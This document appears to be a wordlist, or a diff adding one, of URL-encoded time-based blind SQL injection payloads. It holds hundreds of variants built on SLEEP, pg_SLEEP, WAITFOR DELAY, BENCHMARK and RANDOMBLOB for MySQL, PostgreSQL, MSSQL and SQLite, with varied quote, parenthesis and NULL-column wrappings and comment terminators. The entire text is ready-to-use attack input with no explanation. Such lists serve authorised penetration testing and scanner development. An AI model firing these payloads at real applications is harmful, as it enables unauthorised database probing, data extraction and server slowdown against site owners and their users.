+waitfor%2bdelay%2b%2700%3a00%3a05%27%23%0a
+benchmark%2850000000%2cMD5%281%29%29%0a
+benchmark%2850000000%2cMD5%281%29%29--%0a
+benchmark%2850000000%2cMD5%281%29%29%23%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29--%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29%23%0a
+pg_SLEEP%285%29%0a
+pg_SLEEP%285%29--%0a
+pg_SLEEP%285%29%23%0a
+or%2bpg_SLEEP%285%29%0a
+or%2bpg_SLEEP%285%29--%0a
+or%2bpg_SLEEP%285%29%23%0a
+%27"%0a
+AnD%2bSLEEP%285%29%0a
+AnD%2bSLEEP%285%29--%0a
+AnD%2bSLEEP%285%29%23%0a
+%26%26SLEEP%285%29%0a
+%26%26SLEEP%285%29--%0a
+%26%26SLEEP%285%29%23%0a
+%27%2bAnD%2bSLEEP%285%29%2bANd%2b%271%0a
+%27%26%26SLEEP%285%29%26%26%271%0a
+ORDER%2bBY%2bSLEEP%285%29%0a
+ORDER%2bBY%2bSLEEP%285%29--%0a
+ORDER%2bBY%2bSLEEP%285%29%23%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29%23%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29--%0a
+%2bbenchmark%283200%2cSHA1%281%29%29%2b%27%0a
+%2b%2bSLEEP%2810%29%2b%2b%2b%27%0a
+RANDOMBLOB%28500000000%2f2%29%0a
+AND%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+OR%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+RANDOMBLOB%281000000000%2f2%29%0a
+AND%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+OR%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+SLEEP%281%29%2f%2a%27%2bor%2bSLEEP%281%29%2bor%2b%27"%2bor%2bSLEEP%281%29%2bor%2b"%2a%2f%0a
+%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%29%2520waifor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%29%2520waifor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
